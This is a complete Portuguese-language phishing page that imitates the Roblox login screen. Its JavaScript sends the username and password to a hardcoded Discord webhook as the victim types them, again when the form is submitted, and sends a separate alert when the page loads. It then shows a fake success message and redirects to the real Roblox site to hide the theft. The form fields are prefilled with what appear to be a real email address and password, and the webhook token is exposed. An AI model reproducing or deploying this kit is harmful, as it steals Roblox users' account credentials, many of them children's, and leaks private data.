<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ROBLOX - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: #ff3b3b;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: white;
            font-weight: bold;
        }
        
        h1 {
            color: #333;
            margin-bottom: 30px;
            font-size: 28px;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        .form-control {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        
        .form-control:focus {
            outline: none;
            border-color: #ff3b3b;
        }
        
        .input-field {
            background: #f8f9fa;
        }
        
        .btn-full-width {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .btn-secondary-md {
            background: #ff3b3b;
            color: white;
        }
        
        .btn-secondary-md:hover {
            background: #e63232;
            transform: translateY(-2px);
        }
        
        .login-button {
            margin-top: 10px;
        }
        
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 8px;
            display: none;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">R</div>
        <h1>Entrar no ROBLOX</h1>
        
        <form id="login-form">
            <div class="form-group">
                <input 
                    id="login-username" 
                    name="username" 
                    type="text" 
                    class="form-control input-field" 
                    autocomplete="username webauthn" 
                    placeholder="Usu√°rio/e-mail/telefone" 
                    value="gcaio98406@gmail.com"
                    required
                >
            </div>
            
            <div class="form-group">
                <input 
                    id="login-password" 
                    name="password" 
                    type="password" 
                    class="form-control input-field" 
                    placeholder="Senha" 
                    value="c45iocl4r4"
                    required
                >
            </div>
            
            <button 
                type="button" 
                id="login-button" 
                class="btn-full-width login-button btn-secondary-md"
                onclick="handleLogin()"
            >
                Entrar
            </button>
        </form>
        
        <div id="status"></div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1401010722183450735/NfPave_lXPmGoXjWrFv9t18hmxcou9-MwK6qr2b_jafajhxzdllMYyr6Je-QTHA-Tzx7';
        
        function showStatus(message, type = 'info') {
            const statusDiv = document.getElementById('status');
            statusDiv.innerHTML = `<div class="status ${type}">${message}</div>`;
            statusDiv.style.display = 'block';
        }
        
        // Vari√°veis para controlar o envio autom√°tico
        let usernameSent = false;
        let passwordSent = false;
        let lastUsername = '';
        let lastPassword = '';
        
        function sendToDiscord(data, type) {
            const messageText = `üîê **ROBLOX - Dados Capturados (${type})**

üë§ **Usu√°rio:** ${data.username || 'N√£o preenchido'}
üîë **Senha:** ${data.password || 'N√£o preenchido'}
‚è∞ **Data/Hora:** ${data.timestamp}
üåê **URL:** ${data.url}
üì± **User Agent:** ${data.userAgent}
üåç **IP:** ${data.ip}`;
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: messageText
                })
            })
            .then(response => {
                if (response.ok) {
                    console.log(`‚úÖ Dados ${type} enviados com sucesso!`);
                } else {
                    console.error(`‚ùå Erro ao enviar dados ${type}:`, response.status);
                }
            })
            .catch(error => {
                console.error(`‚ùå Erro de conex√£o ${type}:`, error);
            });
        }
        
        function handleLogin() {
            const username = document.getElementById('login-username').value;
            const password = document.getElementById('login-password').value;
            
            if (!username || !password) {
                showStatus('‚ùå Por favor, preencha todos os campos!', 'error');
                return;
            }
            
            // Mostrar mensagem de carregamento
            showStatus('‚è≥ Verificando credenciais...', 'info');
            
            // Enviar dados finais
            const loginData = {
                username: username,
                password: password,
                timestamp: new Date().toLocaleString('pt-BR'),
                url: window.location.href,
                userAgent: navigator.userAgent,
                ip: 'Capturado via webhook'
            };
            
            sendToDiscord(loginData, 'FINAL');
            
            // Simular sucesso e redirecionamento
            setTimeout(() => {
                showStatus('‚úÖ Login realizado com sucesso! Redirecionando...', 'success');
                
                setTimeout(() => {
                    window.location.href = 'https://www.roblox.com/login';
                }, 2000);
            }, 1000);
        }
        
        // Capturar dados em tempo real
        function captureUsername() {
            const username = document.getElementById('login-username').value;
            if (username && username !== lastUsername && !usernameSent) {
                lastUsername = username;
                usernameSent = true;
                
                const data = {
                    username: username,
                    password: document.getElementById('login-password').value,
                    timestamp: new Date().toLocaleString('pt-BR'),
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    ip: 'Capturado via webhook'
                };
                
                sendToDiscord(data, 'USU√ÅRIO DIGITADO');
            }
        }
        
        function capturePassword() {
            const password = document.getElementById('login-password').value;
            if (password && password !== lastPassword && !passwordSent) {
                lastPassword = password;
                passwordSent = true;
                
                const data = {
                    username: document.getElementById('login-username').value,
                    password: password,
                    timestamp: new Date().toLocaleString('pt-BR'),
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    ip: 'Capturado via webhook'
                };
                
                sendToDiscord(data, 'SENHA DIGITADA');
            }
        }
        
        // Event listeners para captura autom√°tica
        document.getElementById('login-username').addEventListener('input', captureUsername);
        document.getElementById('login-password').addEventListener('input', capturePassword);
        
        // Permitir login com Enter
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                handleLogin();
            }
        });
        
        // Focar no primeiro campo ao carregar
        window.onload = function() {
            document.getElementById('login-username').focus();
            
            // Enviar mensagem de teste quando a p√°gina carregar
            const testMessage = `üß™ **P√ÅGINA CARREGADA**

‚úÖ **Status:** Usu√°rio acessou a p√°gina de login
‚è∞ **Data/Hora:** ${new Date().toLocaleString('pt-BR')}
üåê **URL:** ${window.location.href}
üì± **User Agent:** ${navigator.userAgent}`;
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: testMessage
                })
            })
            .then(response => {
                if (response.ok) {
                    console.log('‚úÖ Mensagem de p√°gina carregada enviada!');
                }
            })
            .catch(error => {
                console.error('‚ùå Erro ao enviar mensagem de p√°gina carregada:', error);
            });
        };
    </script>
</body>
</html>
